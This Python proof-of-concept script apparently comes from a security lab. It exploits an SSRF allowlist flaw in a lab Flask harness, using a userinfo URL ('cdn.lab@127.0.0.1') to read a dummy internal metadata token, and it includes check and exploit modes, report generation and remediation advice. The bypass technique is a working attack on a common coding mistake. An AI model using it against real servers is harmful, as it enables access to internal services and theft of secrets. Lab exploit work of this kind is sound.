#!/usr/bin/env python3
"""
Proof of Concept: POC-SSRF-LAB (SSRF Allowlist Bypass)
======================================================

Bypasses a broken hostname allowlist (netloc.startswith) via URL userinfo:
  http://cdn.lab@127.0.0.1:<port>/internal/metadata

Lab-scoped. Default --mode check (non-destructive).
See ai_agent_instructions/13_LAB_POC_STANDARD.md.

Usage:
    python poc.py http://localhost:5055 --mode check
    python poc.py http://localhost:5055 --mode full --output result.json
"""

from __future__ import annotations

from datetime import datetime
from enum import Enum
from typing import Any, Optional
from urllib.parse import urlparse

import argparse
import json
import logging
import sys
import traceback

try:
    import requests
except ImportError:
    requests = None  # type: ignore

EXPECTED_TOKEN = "LAB_META_TOKEN=srl-ssrf-lab-9f3a"

VULN_INFO = {
    "name": "SSRF Allowlist Bypass",
    "cve": "POC-SSRF-LAB",
    "cwe": "CWE-918",
    "severity": "HIGH",
    "cvss_score": 8.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
    "affected_software": "POC-SSRF-LAB Flask harness",
    "affected_versions": "lab-1.0",
    "fixed_version": "Parse hostname via urlparse().hostname; deny private IPs; allowlist exact hosts",
    "description": (
        "Server-side fetch allowlists URLs by checking whether urlparse().netloc "
        "startswith 'cdn.lab'. Userinfo form cdn.lab@127.0.0.1 passes the check while "
        "the HTTP client requests 127.0.0.1, enabling SSRF to internal metadata."
    ),
    "impact": "Read internal metadata token via SSRF (lab dummy secret).",
    "attack_vector": "Network",
    "authentication": "None",
    "author": "Security Research Lab",
    "date": "2026-09-06",
    "references": [
        "https://cwe.mitre.org/data/definitions/918.html",
        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
    ],
}


class PocResult(str, Enum):
    VULNERABLE = "VULNERABLE"
    NOT_VULNERABLE = "NOT_VULNERABLE"
    UNKNOWN = "UNKNOWN"
    ERROR = "ERROR"


class PocFormatter(logging.Formatter):
    SYMBOLS = {
        logging.DEBUG: "\033[36m[D]\033[0m",
        logging.INFO: "\033[37m[*]\033[0m",
        logging.WARNING: "\033[33m[!]\033[0m",
        logging.ERROR: "\033[31m[-]\033[0m",
        logging.CRITICAL: "\033[1;31m[!!]\033[0m",
    }
    SUCCESS = 25
    ACTION = 15

    def format(self, record: logging.LogRecord) -> str:
        if record.levelno == self.SUCCESS:
            symbol = "\033[32m[+]\033[0m"
        elif record.levelno == self.ACTION:
            symbol = "\033[35m[>]\033[0m"
        else:
            symbol = self.SYMBOLS.get(record.levelno, "[?]")
        return f"{symbol} {record.getMessage()}"


def setup_logging(verbose: bool = False) -> logging.Logger:
    logger = logging.getLogger("poc_ssrf_lab")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    logging.addLevelName(PocFormatter.SUCCESS, "SUCCESS")
    logging.addLevelName(PocFormatter.ACTION, "ACTION")
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(PocFormatter())
    logger.handlers.clear()
    logger.addHandler(handler)

    def success(self, message, *args, **kwargs):
        self.log(PocFormatter.SUCCESS, message, *args, **kwargs)

    def action(self, message, *args, **kwargs):
        self.log(PocFormatter.ACTION, message, *args, **kwargs)

    logger.success = success.__get__(logger)  # type: ignore[attr-defined]
    logger.action = action.__get__(logger)  # type: ignore[attr-defined]
    return logger


logger = setup_logging()


def _require_requests() -> None:
    if requests is None:
        print("Error: install requests (pip install -r requirements.txt)", file=sys.stderr)
        sys.exit(2)


def build_bypass_url(target_base: str) -> str:
    """Craft userinfo allowlist bypass pointing at local metadata on the same host:port."""
    parsed = urlparse(target_base)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port
    if port:
        authority = f"{host}:{port}"
    else:
        authority = host
    # netloc startswith cdn.lab → pass; real request host → 127.0.0.1 or container localhost
    # From inside the app process, 127.0.0.1 is the same container.
    return f"http://cdn.lab@127.0.0.1:{port or 5055}/internal/metadata"


class LabPoC:
    def __init__(self, target: str, options: dict | None = None):
        self.target = target.rstrip("/")
        self.options = options or {}
        self.vuln_info = VULN_INFO
        self.result = PocResult.UNKNOWN
        self.evidence: list[str] = []
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None
        self._bypass_url = self.options.get("bypass_url") or build_bypass_url(self.target)

    def _session(self) -> "requests.Session":
        _require_requests()
        s = requests.Session()
        s.verify = self.options.get("verify_ssl", False)
        proxy = self.options.get("proxy")
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        return s

    def print_banner(self) -> None:
        v = self.vuln_info
        print()
        print("=" * 60)
        print(f" PoC: {v['cve']} - {v['name']}")
        print("=" * 60)
        print(f" Target:   {self.target}")
        print(f" Severity: {v['severity']} (CVSS: {v['cvss_score']})")
        print(f" Bypass:   {self._bypass_url}")
        print("=" * 60)
        print()

    def add_evidence(self, text: str) -> None:
        self.evidence.append(text)
        logger.success(f"Evidence: {text[:200]}")

    def check(self) -> bool:
        """Non-destructive: confirm /fetch exists and denylist blocks direct loopback."""
        logger.action(f"Checking {self.target}...")
        timeout = self.options.get("timeout", 15)
        session = self._session()
        try:
            health = session.get(f"{self.target}/health", timeout=timeout)
            if health.status_code != 200:
                logger.error(f"/health returned {health.status_code}")
                return False
            logger.info("Health OK")

            # Direct internal URL should be blocked by allowlist
            blocked = session.get(
                f"{self.target}/fetch",
                params={"url": f"{self.target}/internal/metadata"},
                timeout=timeout,
            )
            if blocked.status_code == 403:
                logger.success("Allowlist blocks direct internal URL (expected)")
                self.add_evidence("Direct /internal/metadata via /fetch → 403")
                return True
            if blocked.status_code == 200 and EXPECTED_TOKEN in blocked.text:
                # Allowlist missing entirely — still a finding
                self.add_evidence("Direct fetch of metadata succeeded (allowlist absent)")
                return True
            logger.warning(f"Unexpected check response: {blocked.status_code} {blocked.text[:200]}")
            # Surface exists; exploit may still work
            return blocked.status_code in (200, 403, 502)
        except requests.RequestException as exc:
            logger.error(f"Check failed: {exc}")
            return False

    def exploit(self) -> dict[str, Any]:
        logger.action("Sending allowlist-bypass SSRF payload...")
        timeout = self.options.get("timeout", 15)
        session = self._session()
        try:
            resp = session.get(
                f"{self.target}/fetch",
                params={"url": self._bypass_url},
                timeout=timeout,
            )
            body = resp.text
            if resp.status_code == 200 and EXPECTED_TOKEN in body:
                self.add_evidence(f"Token recovered via SSRF: {EXPECTED_TOKEN}")
                return {
                    "success": True,
                    "evidence": EXPECTED_TOKEN,
                    "details": {"status_code": resp.status_code, "bypass_url": self._bypass_url},
                }
            return {
                "success": False,
                "error": f"status={resp.status_code}, token not found",
                "details": {"body_preview": body[:400], "bypass_url": self._bypass_url},
            }
        except requests.RequestException as exc:
            return {"success": False, "error": str(exc)}

    def verify(self, exploit_result: dict) -> bool:
        if not exploit_result.get("success"):
            return False
        ev = str(exploit_result.get("evidence") or "")
        return EXPECTED_TOKEN in ev or EXPECTED_TOKEN in "".join(self.evidence)

    def cleanup(self) -> None:
        logger.info("Cleanup: no persistent artifacts (read-only SSRF)")

    def execute(self, mode: str = "check") -> dict:
        self.start_time = datetime.now()
        self.print_banner()
        out: dict[str, Any] = {
            "target": self.target,
            "vuln_info": self.vuln_info,
            "mode": mode,
            "phases": {},
            "result": PocResult.UNKNOWN.value,
            "evidence": [],
            "start_time": self.start_time.isoformat(),
            "end_time": None,
            "duration": 0,
        }

        logger.info("Phase 1: Checking...")
        try:
            is_vuln = self.check()
            out["phases"]["check"] = {"completed": True, "vulnerable": is_vuln}
            if is_vuln:
                logger.success("Target surface looks vulnerable / allowlist present")
                if mode == "check":
                    self.result = PocResult.VULNERABLE
                    out["result"] = self.result.value
                    self._finalize(out)
                    return out
            else:
                self.result = PocResult.NOT_VULNERABLE
                out["result"] = self.result.value
                if mode == "check":
                    self._finalize(out)
                    return out
                logger.warning("Check negative; continuing because mode != check")
        except Exception as exc:
            logger.error(f"Check error: {exc}")
            logger.debug(traceback.format_exc())
            out["phases"]["check"] = {"completed": False, "error": str(exc)}
            self.result = PocResult.ERROR
            out["result"] = self.result.value
            self._finalize(out)
            return out

        exploit_result: dict = {}
        if mode in ("exploit", "full"):
            logger.info("Phase 2: Exploiting...")
            try:
                exploit_result = self.exploit()
                out["phases"]["exploit"] = {"completed": True, "result": exploit_result}
                if exploit_result.get("success"):
                    logger.success("Exploitation successful")
                else:
                    logger.error(exploit_result.get("error", "exploit failed"))
            except Exception as exc:
                logger.error(f"Exploit error: {exc}")
                out["phases"]["exploit"] = {"completed": False, "error": str(exc)}

        if mode == "exploit":
            self.result = (
                PocResult.VULNERABLE if exploit_result.get("success") else PocResult.NOT_VULNERABLE
            )
            out["evidence"] = self.evidence
            out["result"] = self.result.value
            self._finalize(out)
            return out

        logger.info("Phase 3: Verifying...")
        verified = self.verify(exploit_result)
        out["phases"]["verify"] = {"completed": True, "verified": verified}
        self.result = PocResult.VULNERABLE if verified else PocResult.UNKNOWN
        if verified:
            logger.success("Exploitation VERIFIED")
        else:
            logger.warning("Could not verify exploitation")

        logger.info("Phase 4: Cleanup...")
        try:
            self.cleanup()
            out["phases"]["cleanup"] = {"completed": True}
        except Exception as exc:
            out["phases"]["cleanup"] = {"completed": False, "error": str(exc)}

        out["evidence"] = self.evidence
        out["result"] = self.result.value
        self._finalize(out)
        return out

    def _finalize(self, result: dict) -> None:
        self.end_time = datetime.now()
        result["end_time"] = self.end_time.isoformat()
        result["duration"] = (self.end_time - self.start_time).total_seconds()
        colors = {
            PocResult.VULNERABLE: "\033[1;31m",
            PocResult.NOT_VULNERABLE: "\033[1;32m",
            PocResult.UNKNOWN: "\033[1;33m",
            PocResult.ERROR: "\033[1;35m",
        }
        color = colors.get(self.result, "\033[0m")
        print()
        print("=" * 60)
        print(f" Result: {color}{self.result.value}\033[0m")
        print(f" Duration: {result['duration']:.2f}s")
        for e in self.evidence:
            print(f"   - {e[:120]}")
        if self.result == PocResult.VULNERABLE:
            print(f" Impact: {self.vuln_info['impact']}")
            print(f" Fix: {self.vuln_info['fixed_version']}")
        print("=" * 60)
        print()


def generate_report(poc: LabPoC) -> str:
    v = poc.vuln_info
    evidence = "\n".join(f"- {e}" for e in poc.evidence) or "N/A"
    return f"""# Vulnerability Report: {v['cve']} - {v['name']}

## Executive Summary

{v['description']}

**CVSS**: {v['cvss_score']} ({v['severity']})

## Impact

{v['impact']}

## Proof of Concept

```bash
python poc.py http://localhost:5055 --mode full --output result.json
```

Bypass URL pattern: `http://cdn.lab@127.0.0.1:5055/internal/metadata`

## Evidence

{evidence}

## Remediation

{v['fixed_version']}

## References

""" + "\n".join(f"- {r}" for r in v.get("references", [])) + "\n"


def main() -> None:
    p = argparse.ArgumentParser(description=f"PoC: {VULN_INFO['cve']} - {VULN_INFO['name']}")
    p.add_argument("target", help="Target base URL (e.g. http://localhost:5055)")
    p.add_argument("--mode", choices=["check", "exploit", "full"], default="check")
    p.add_argument("--bypass-url", help="Override SSRF bypass URL")
    p.add_argument("--output", help="Write JSON results")
    p.add_argument("--report", help="Write Markdown report")
    p.add_argument("--proxy", help="HTTP proxy")
    p.add_argument("--timeout", type=int, default=15)
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    poc = LabPoC(
        args.target,
        options={
            "proxy": args.proxy,
            "timeout": args.timeout,
            "verify_ssl": False,
            "bypass_url": args.bypass_url,
        },
    )
    result = poc.execute(mode=args.mode)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(result, f, indent=2, default=str)
        logger.info(f"Results saved to {args.output}")

    if args.report:
        with open(args.report, "w", encoding="utf-8") as f:
            f.write(generate_report(poc))
        logger.info(f"Report saved to {args.report}")

    if result["result"] == PocResult.VULNERABLE.value:
        sys.exit(0)
    if result["result"] == PocResult.NOT_VULNERABLE.value:
        sys.exit(1)
    sys.exit(2)


if __name__ == "__main__":
    main()
